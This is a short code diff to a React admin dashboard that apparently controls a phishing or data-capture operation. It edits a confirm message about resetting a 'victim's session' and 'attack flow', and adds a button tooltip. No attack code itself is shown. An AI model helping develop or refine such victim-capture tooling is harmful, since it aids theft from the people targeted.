@@ -266,7 +266,7 @@ export function AdminDashboard() {
   };
 
   const handleResetVictimState = async () => {
-    if (window.confirm("Are you sure you want to reset the victim's session? All captured data for this session will be cleared, but your configuration will be kept.")) {
+    if (window.confirm("Are you sure you want to reset the victim's session? This will restart the attack flow based on your current mode, clearing any captured data for the session.")) {
       try {
         await fetch("/api/state", {
           method: "POST",
@@ -379,7 +379,7 @@ export function AdminDashboard() {
                         </DropdownMenuItem>
                       </DropdownMenuContent>
                     </DropdownMenu>
-                    <Button variant="outline" size="icon" onClick={handleResetVictimState}><History className="h-4 w-4" /></Button>
+                    <Button variant="outline" size="icon" onClick={handleResetVictimState} title="Reset Victim Session"><History className="h-4 w-4" /></Button>
                     <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data'}>
                         <Trash2 className="h-4 w-4" />
                     </Button>
@@ -660,3 +660,5 @@ export function AdminDashboard() {
     </div>
   );
 }
+
+    
